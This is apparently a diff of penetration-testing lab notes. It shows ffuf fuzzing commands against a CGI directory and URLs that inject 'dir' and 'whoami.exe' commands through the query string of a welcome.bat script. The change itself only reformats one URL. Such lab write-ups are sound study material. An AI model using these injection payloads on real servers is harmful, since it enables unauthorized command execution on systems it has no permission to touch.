@@ -115,6 +115,5 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/F
 ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
 
 http://10.129.204.227:8080/cgi/welcome.bat?&dir
-[http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe](http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
-)
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 ```
